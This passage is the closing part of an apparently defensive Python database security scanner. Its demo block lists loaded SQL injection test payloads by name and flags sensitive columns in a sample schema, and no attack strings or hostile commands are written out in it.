            }
            for r in results
        ], indent=2)


# Main execution
if __name__ == "__main__":
    import asyncio
    
    async def main():
        db_security = AdvancedDatabaseSecurity()
        
        print("Database Security Scanner")
        print("=" * 50)
        
        # Test SQL injection payloads
        print("\nLoaded SQL Injection Payloads:")
        for payload in db_security.sqli_tester.payloads[:5]:
            print(f"  [{payload.category}] {payload.name}: {payload.payload[:30]}...")
        
        # Test schema analysis
        print("\nTesting Schema Analysis:")
        test_schema = {
            "users": ["id", "username", "password_hash", "email", "ssn", "credit_card_number"],
            "orders": ["order_id", "user_id", "total", "card_last_four"],
            "logs": ["log_id", "action", "timestamp"]
        }
        
        sensitive = db_security.analyze_schema_security(test_schema)
        for col in sensitive:
            print(f"  [{col['category']}] {col['table']}.{col['column']}")
        
        # Print statistics
        print("\nStatistics:")
        stats = db_security.get_statistics()
        for key, value in stats.items():
            print(f"  {key}: {value}")
    
    asyncio.run(main())
